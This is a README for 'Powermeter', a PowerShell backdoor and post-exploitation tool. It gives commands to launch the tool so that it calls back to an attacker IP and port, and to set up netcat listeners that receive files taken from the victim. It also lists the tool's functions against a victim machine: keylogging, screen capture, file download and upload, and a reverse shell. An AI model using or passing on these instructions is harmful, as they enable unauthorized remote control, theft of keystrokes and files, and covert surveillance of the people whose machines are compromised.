# Powermeter
Powermeter is a basic powershell based backdoor/post exploit tool. Main functionalities are shown below. You can also check the video at the bottom of the page.
Note: It is highly recommended to watch the video at 1080p due to low quality of recording. It will be fixed soon :=)

To run this program you need to solve execution-policy problem on your system.

## How to run?

	#Import powermeter functions
	>> PS C:\Users\decoder\Desktop> . .\powermeter.ps1
	
	#Start powermeter.
	#When this command is invoked, powermeter will establish a TCP connection to $SHOST:$SPORT (in this case 192.168.214.1:9190). After that, powermeter remote user interface will be ready to take commands and attacker will be able to use powermeter via this tcp connection.
	#$SPORT should be opened at $SHOST machine (in other words, attacker machine).'nc -lvp <SPORT>' command can do the trick. The main connection between powermeter and attacker will be established via this port. Attacker send commands to powermeter from this port. 
	#$FLPORT will be used for any job which requires file transfer (those are download,upload,screencap and keylogger threads). For example, if you want to download a from victim machine, you need to provide a listener $FLPORT at $SHOST machine like this: 'nc -lvp <FLPORT> > downloadedFile'. After that you can call the download function from powermeter shell like this: 'download C:\Users\decoder\Desktop\cozbeni.zip'
	>> PS C:\Users\decoder\Desktop> Start-Powermeter -SHOST 192.168.214.1 -SPORT 9190 -FLPORT 9192
	
	Parameters:
	SHOST - attacker machine's IP.
	SPORT - an open attacker machine port that waits for powermeter connection. #'nc -lvp <SPORT>' command can do the trick.
	FLPORT - attacker machine's file transfer port. This port should be opened at attacker's side to achieve jobs which includes downloading and uploading. (Screencapturing and keylogging are also inclusive because both of them use downloader threads. You may want to see the demo video to see how it works.)

In main module:

Powermeter>show options

Options
=============

	 Command                			 Description
	 -------                			 -----------
	 get sysinfo            			 Get system information about victim machine
	 get username           			 Get username of victim machine
	 set FLPORT=<port>      			 Set file transfer port
	 rshell                 			 Open reverse shell module
	 start keylogger        			 Start keylogger thread
	 show jobs              			 Show all active threads
	 stop job -keylogger    			 Stop keylogger thread and download captured keystrokes from file port
	 stop job -reverseShell 			 Stop reverse shell session and thread
	 stop job -sendFile     			 Stop file downloading thread
	 stop job -receiveFile  			 Stop file uploading thread
	 stop job -all          			 Stop all active threads
	 screencap -screen      			 Capture screenshot of victim machine [WHOLE SCREEN] and download it
	 screencap -activeWindow			 Capture screenshot of victim machine [ACTIVE WINDOW] and download it
	 download <fileFromVictim>			 Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]
	 upload <fileToVictim>  			 Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]
	 exit                   			 Exit the program
	 Important: File transfer port should be opened at attacker's side to achieve downloading,uploading files.

In reverse shell module:

Powermeter>reverse_shell>show options

Options
=============

	 Command                			 Description
	 -------                			 -----------
	 set LHOST=<IPv4>       			 Set local IP address
	 set LPORT=<port>       			 Set local port address
	 run                    			 Start reverse shell
	 back                   			 Exit from reverse shell module


A quick demo video
=============

[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/0D49nX_bD_8/0.jpg)](https://www.youtube.com/watch?v=0D49nX_bD_8)

